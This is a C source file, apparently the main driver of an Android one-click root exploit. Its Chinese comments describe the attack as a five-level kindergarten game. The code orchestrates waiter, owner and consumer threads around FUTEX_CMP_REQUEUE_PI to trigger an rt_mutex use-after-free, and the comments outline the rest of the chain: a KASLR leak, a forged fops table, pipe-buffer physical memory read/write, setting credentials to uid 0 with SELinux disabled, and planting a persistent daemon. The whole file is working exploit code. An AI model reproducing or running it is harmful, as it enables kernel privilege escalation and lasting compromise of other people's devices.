/* ==========================================================================
 * 【闯关总地图】duchamp-root 一键 Root — "幼儿园闯关游戏"版注释
 * ==========================================================================
 * 园长     = 手机内核（最高权威，管着所有小朋友和玩具）
 * 小朋友   = 普通 App（只能玩自己的玩具）
 * 园长助手 = root 权限（可开所有柜子、改所有规则、发糖果）
 * 门锁缺陷 = CVE-2026-43499（rt_mutex "鬼标签"漏洞）
 * 魔法道具 = preload.so（本文件编译产物，塞进书包带进幼儿园）
 *
 * 五关流程：
 *   第 1 关  偷看园长排班表     slide.c   = 弄清园长办公室门牌号(KASLR 泄漏 _stext)
 *   第 2 关  偷换玩具柜钥匙牌   fops.c    = 涂改 ops 表，假装"被授权开柜子的人"
 *   第 3 关  拿到万能钥匙       pipe.c    = pipe buffer 改造成任意物理地址读写模具
 *   第 4 关  戴上园长徽章       root.c    = 改人事档案 cred(uid=0)、请走检查员
 *   第 5 关  安插自己的管家     preload.c = 藏进书包的 ksud 小机器人永久安家
 *
 * 本文件 main.c = 闯关报名处：按顺序带队闯完五关。
 * ========================================================================== */

#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int owner_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

/* --------------------------------------------------------------------------
 * 三位"演双簧"的小朋友（第 2 关起反复用到的一套编排）：
 *   waiter  = 传纸条的小朋友：先抢到 pi_chain 玩具，再去 f_wait 排队等换玩具
 *   owner   = 占着 pi_target 玩具的小朋友：故意也去排队抢 pi_chain，
 *             和 waiter 面对面互相等对方 —— 制造"死锁环"触发园长的 buggy 逻辑
 *   consumer= 捣乱的小朋友：趁 waiter 在 pselect 里睡觉时反复喊老师
 *             "给 waiter 改优先级"(sched_setattr)，逼园长沿着鬼标签走路
 * -------------------------------------------------------------------------- */
void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid, tid);

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int call_num = atomic_load(&consumer_calls);

        /* Step 1: RT-ENTER (expected to fail with EPERM — this
         * "primes" the PI chain before the nice-based sched_setattr
         * actually triggers rt_mutex_setprio -> adjust_prio_chain).
         * Mirrors slide_consumer_thread two-stage pattern. */
        pr_info("main consumer call#%d tid=%d stage=RT-ENTER "
                "sched_setattr SCHED_FIFO prio=50\n",
                call_num, tid);
        fflush(stdout);
        errno = 0;
        long sched_ret = sched_setattr_tid_rt(tid, 50);
        int call_errno = errno;
        pr_info("main consumer call#%d stage=RT-DONE ret=%ld errno=%d "
                "(EPERM=1 means no PI walk on this call)\n",
                call_num, sched_ret, call_errno);
        fflush(stdout);

        /* Step 2: NICE-ENTER — only if RT returned EPERM (as expected).
         * This is the call that actually walks the PI chain. */
        if (sched_ret != 0 && call_errno == EPERM) {
          pr_info("main consumer call#%d stage=NICE-ENTER "
                  "sched_setattr nice=%d (this DOES trigger "
                  "rt_mutex_setprio -> adjust_prio_chain)\n",
                  call_num, PSELECT_CONSUMER_NICE);
          fflush(stdout);
          errno = 0;
          sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
          call_errno = errno;
          pr_info("main consumer call#%d stage=NICE-DONE ret=%ld errno=%d\n",
                  call_num, sched_ret, call_errno);
          fflush(stdout);
        }

        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("main consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
                  tid, sched_ret, call_errno,
                  atomic_load(&consumer_success));
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&owner_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

/* 【查岗】读 /proc/self/task/<tid>/wchan, 确认 owner 线程确实睡死在
 * futex 上。只有它卡死在 pi_chain, 死锁环(owner->chain->waiter->target
 * ->owner)才闭合, FUTEX_CMP_REQUEUE_PI 才会撞见死锁走进 buggy
 * remove_waiter 回滚(EDEADLK)并留下鬼标签(UAF)。 */
static int owner_wchan_is_futex(int tid) {
  char path[64];
  char buf[128];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  return strstr(buf, "futex") != NULL;
}

/* 【开场编排】等三位小朋友就位后，喊一声"换玩具！"(FUTEX_CMP_REQUEUE_PI)。
 * 园长处理换玩具时发现死锁环(EDEADLK)，回滚路径里会把 waiter 的排队标签
 * (内核栈上的 rt_mutex_waiter)错摘成别人挂的假标签 —— "鬼标签"就此诞生。 */
void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* EDEADLK 必须发生在 requeue 的链遍历内部, 所以 owner 必须先卡死在
   * pi_chain 上。用 wchan 查岗, 最多等 500ms。 */
  int otid = atomic_load(&owner_tid);
  int blocked = 0;
  for (int i = 0; i < 100 && !blocked; i++) {
    blocked = owner_wchan_is_futex(otid);
    if (!blocked) {
      usleep(5000);
    }
  }
  pr_info("main owner_blocked_on_futex=%d tid=%d\n", blocked, otid);
  if (!blocked) {
    usleep(50000);
  }
  /* wchan=futex 只说明 owner 睡下了, owner->pi_blocked_on 指向 chain
   * waiter 的 PI 依赖还需一点时间建立。立刻 requeue 会撞上空窗返 0。
   * 再等 20ms 让环完全闭合。 */
  usleep(20000);

  errno = 0;
  long req = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &f_pi_target, 0);
  pr_info("main FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d "
          "(need ret=-1 errno=35: buggy remove_waiter rollback only runs "
          "on EDEADLK)\n",
          req, errno);
  if (req >= 0) {
    pr_warning("main requeue returned success (no EDEADLK): PI cycle not "
               "armed, W1 write primitive will NOT fire this attempt\n");
  }

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

int opt_disabled_selinux;

/* 【闯关主流程】五关按顺序闯：
 * 1) perf 或 slide 路线偷看排班表，拿到园长办公室门牌号(KASLR _stext)
 * 2) 准备"魔法书包"(回收一个内核页)再演双簧，偷换玩具柜钥匙牌(FOPS)
 * 3) (fops.c 内部继续) 用钥匙牌打开特殊柜子，把魔法水管(pipe)改造成万能钥匙
 * 4) (pipe.c -> root.c) 用万能钥匙改人事档案，戴上园长徽章
 * 5) (root.c -> preload.c) 派出书包里的 ksud 小管家永久安家 */
int run_exploit(int argc, char **argv) {
  opt_disabled_selinux = 0;
  char *env = getenv("DISABLE_SELINUX");
  if (env != NULL && strcmp(env, "1") == 0) {
    opt_disabled_selinux = 1;
  }
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--disabled-selinux") == 0) {
      opt_disabled_selinux = 1;
    }
  }

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  /* 【第 1 关】先试"偷看奖品柜玻璃反光"(perf 侧信道)；不行再用
   * "传话纸条背面墨痕"(slide 路线) 拼出园长办公室门牌号 */
  char *perf_only = getenv("PERF_ONLY");
  int perf_only_mode = perf_only != NULL && strcmp(perf_only, "1") == 0;
  uint64_t text_base = perf_leak_text_base();
  if (text_base) {
    kaslr_base = text_base;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (perf)\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
  } else if (perf_only_mode) {
    /* 安全阀:PERF_ONLY=1 时只验证 perf 路线,失败也不跑 slide/UAF */
    pr_warning("perf-only: perf route failed, skipping slide fallback\n");
    return 1;
  } else if (!slide_leak_kernel_base()) {
    pr_error("kaslr leak failed\n");
    return 1;
  }

  if (perf_only_mode) {
    pr_success("perf-only done pid=%d kaslr=%d base=%016zx slide=%016zx\n",
               getpid(), kaslr_done, kaslr_base, kaslr_slide);
    return 0;
  }

  /* 安全阀:SLIDE_ONLY=1 时 KASLR 泄露成功即停,不进 UAF/书包阶段 */
  char *slide_only = getenv("SLIDE_ONLY");
  if (slide_only != NULL && strcmp(slide_only, "1") == 0) {
    pr_success("slide-only done pid=%d kaslr=%d base=%016zx slide=%016zx\n",
               getpid(), kaslr_done, kaslr_base, kaslr_slide);
    return 0;
  }

  pin_to_core(CORE);
  /* 【魔法书包】回收一个我们能控制内容的内核页 —— 后面所有关卡都要把
   * 假结构体(假排班表/假钥匙牌/假水管)放进这个页里 */
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  /* 【第 2~3 关】演双簧 + 偷换钥匙牌 + 改造魔法水管 */
  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}
